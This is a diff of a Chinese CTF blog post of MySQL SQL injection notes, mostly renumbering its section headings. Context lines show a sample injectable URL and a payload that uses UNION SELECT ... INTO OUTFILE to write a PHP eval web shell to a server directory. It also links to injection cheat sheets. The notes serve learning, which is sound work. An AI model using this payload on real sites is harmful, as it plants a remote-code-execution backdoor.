@@ -5,9 +5,9 @@ tags: [CTF,SQL注入,web]
 categories: Web安全
 copyright: true
 ---
-# 简介
+# 0x00 简介
 
-# 基本
+# 0x01 基本
 ## 查看当前数据库版本
 + VERSION()
 + @@VERSION
@@ -70,7 +70,7 @@ copyright: true
 	+  /\*! select \* from test \*/
 	+ 语句会被执行
 
-# 注入技术
+# 0x02 注入技术
 ## 判断是否存在注入
 假设有: www.test.com/chybeta.php?id=1
 ### 数值型注入
@@ -195,14 +195,14 @@ UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/te
 
 ## 命令执行
 
-# 绕过技巧
+# 0x04 绕过技巧
 ##  sqlmap-tamper编写
-# 版本特性
+# 0x05 版本特性
 
-# 常见sql注入位置
+# 0x06 常见sql注入位置
 
-# 工具
-# 参考
+# 0x07 工具
+# 0x08 参考
 + [MySQL_Testing_Injection](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
 + [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
 + [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell)
